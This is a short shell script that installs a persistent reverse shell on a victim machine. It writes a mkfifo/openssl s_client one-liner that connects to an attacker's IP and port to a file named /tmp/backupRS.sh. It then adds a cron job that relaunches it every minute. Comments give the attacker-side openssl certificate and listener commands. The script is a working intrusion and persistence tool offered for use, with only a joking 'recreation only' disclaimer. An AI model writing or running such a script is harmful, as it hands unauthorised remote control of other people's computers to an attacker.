#!/bin/sh

#---------\\\ A ZinZloun Joint for recreation only \\\--------#  

#Here I use mkfifo to spawn a reverse shell connection using openssl. This script install a cron job that run the procedure (saved as a shell script) every minute
# This script must be executed on the victim and you must provide the IP and the port as a unique parameter (<IP>:<Port>) of the attacker machine where the openssl server is listening

#On the attacker machine:
# - create the needed certficate
#	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/C=IT/ST=Tuscany/L=Chianti Shire/O=Umbrella Corp/OU=ITC/CN=localhost"
# - lunch the server and wait...
#	openssl s_server -quiet -key key.pem -cert cert.pem -port 443

#-----------  ^[*_*]^ ------------------------------------------#

#check the IP and port parameter
if [ $# -eq 0 ]
  then
    echo "You must provide the IP and Port as argument: $0 <IP>:<Port>"
    exit
fi

#create shell script
echo "mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect $1 > /tmp/x; rm /tmp/x" > /tmp/backupRS.sh 
#make it executable
chmod u+x /tmp/backupRS.sh
#create cron that execute the shell script
crontab -l | { cat; echo "*/1 * * * * /tmp/backupRS.sh"; } | crontab
